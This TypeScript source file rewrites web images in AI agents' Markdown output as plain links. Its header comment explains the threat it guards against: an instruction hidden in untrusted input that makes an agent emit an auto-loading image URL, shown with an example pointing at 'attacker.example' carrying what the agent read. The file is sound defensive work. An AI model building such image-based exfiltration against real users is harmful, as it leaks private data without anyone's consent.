/**
 * Custom agents — what an agent writes never loads anything by itself: a web image in its Markdown
 * (the report, the content of staged or applied pages) becomes a plain link to that image.
 *
 * Agents read text nobody vouches for (mails, form answers, webhook bodies, MCP results). An image
 * address is the classic way an instruction hidden in such text smuggles data out: the browser
 * fetches `![](https://attacker.example/?q=<what the agent read>)` the moment the page opens — in
 * the editor, the feed, a share link. A link is only followed when a person clicks it. Images of
 * this workspace (`onefile:`), data: images and relative paths stay images; code spans and fenced
 * code stay as written.
 */

/** A target the browser would fetch from somewhere else: http(s) or protocol-relative. */
const WEB = /^(https?:)?\/\//i

/** ```, ~~~ fences (CommonMark: up to three spaces in front). */
const FENCE = /^ {0,3}(`{3,}|~{3,})/

/** ![alt](<url> "title") — the target with or without angle brackets, an optional title. */
const INLINE = /!\[((?:\\.|[^\]\\])*)\]\(\s*(<[^>\n]+>|[^\s)]+)((?:\s+(?:"[^"\n]*"|'[^'\n]*'|\([^)\n]*\)))?)\s*\)/g

/** ![alt][label] · ![alt][] · ![alt] (a reference to a definition further down). */
const REF = /!\[((?:\\.|[^\]\\])*)\](?:\[((?:\\.|[^\]\\])*)\])?/g

/** [label]: <url> "title" */
const DEF = /^ {0,3}\[((?:\\.|[^\]\\])+)\]:\s*(<[^>\n]+>|\S+)/

/** More image starts than any real line has: every "![" becomes "[" (keeps the patterns above linear in practice). */
const MANY = 50

const bare = (target: string) => target.replace(/^<|>$/g, '').trim()
const label = (s: string) => s.trim().replace(/\s+/g, ' ').toLowerCase()

/** Reference labels whose definition points to the web. */
function webDefinitions(lines: string[]): Set<string> {
  const out = new Set<string>()
  for (const line of lines) {
    const m = DEF.exec(line)
    if (m && WEB.test(bare(m[2]))) out.add(label(m[1]))
  }
  return out
}

/** One stretch of text outside code: web images → links. */
function plain(text: string, defs: Set<string>): string {
  if (text.split('![').length - 1 > MANY) return text.replace(/!\[/g, '[')
  const inline = text.replace(INLINE, (all, alt: string, target: string, title: string) => {
    const url = bare(target)
    if (!WEB.test(url)) return all
    return `[${alt.trim() ? alt : url.replace(/[[\]]/g, '')}](${target}${title})`
  })
  if (!defs.size) return inline
  return inline.replace(REF, (all, alt: string, ref: string | undefined, at: number, src: string) => {
    // an inline image kept above (a local one) is not a reference
    if (src[at + all.length] === '(') return all
    return defs.has(label(ref || alt)) ? all.slice(1) : all
  })
}

/** Markdown with every web image (inline or by reference) turned into a link to it. */
export function withoutWebImages(markdown: string): string {
  if (!markdown.includes('![')) return markdown
  const lines = markdown.split('\n')
  const defs = webDefinitions(lines)
  let fence: string | null = null
  return lines
    .map((line) => {
      const f = FENCE.exec(line)
      if (fence) {
        if (f && f[1][0] === fence[0] && f[1].length >= fence.length) fence = null
        return line
      }
      if (f) {
        fence = f[1]
        return line
      }
      // inline code spans are kept as they are
      return line
        .split(/(`+[^`]*`+)/)
        .map((part, i) => (i % 2 ? part : plain(part, defs)))
        .join('')
    })
    .join('\n')
}
